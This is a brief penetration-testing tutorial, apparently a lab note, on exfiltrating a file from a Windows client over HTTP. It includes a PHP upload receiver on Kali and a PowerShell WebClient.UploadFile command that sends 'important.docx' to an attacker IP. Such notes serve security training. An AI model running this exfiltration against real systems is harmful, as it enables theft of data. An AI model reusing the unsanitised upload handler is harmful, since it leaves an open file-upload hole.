Data exfil on windows clients can be tricky, as TFTP, FTP and HTTP servers are rarely used on windows by defalut. 

If outbound HTTP traffic is allowed (usually is), we can use the System.Net.WebClient PowerShell class to upload data to our Kali machine through an HTTP POST request.

### Kali:
Create a PHP script upload.php and save it to our Kali webroot directory, /var/www/html:
```
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```
This script processes an incoming upload request and saves to designated directory.

Create the uploads folder and modify permissions, granting www-data user ownership and write permissions (note that this will allow anyone interactice with uploads.php to upload files to our Kali VM):
`sudo mkdir /var/www/uploads`
`ps -ef | grep apache`
`sudo chown www-data: /var/www/uploads`
`ls -la`

### Windows:
Invoke the UploadFile method from System.Net.WebClient class to exfiltrate the document, important.docx:
`powershell (New-Object
System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')`

### Kali:
Verify Transfer:
`ls -la`
total 360
drwxr-xr-x 2 www-data www-data 4096 Feb 2 00:38 .
drwxr-xr-x 4 root root 4096 Feb 2 00:33 ..
-rw-r--r-- 1 www-data www-data 359250 Feb 2 00:38 important.docx





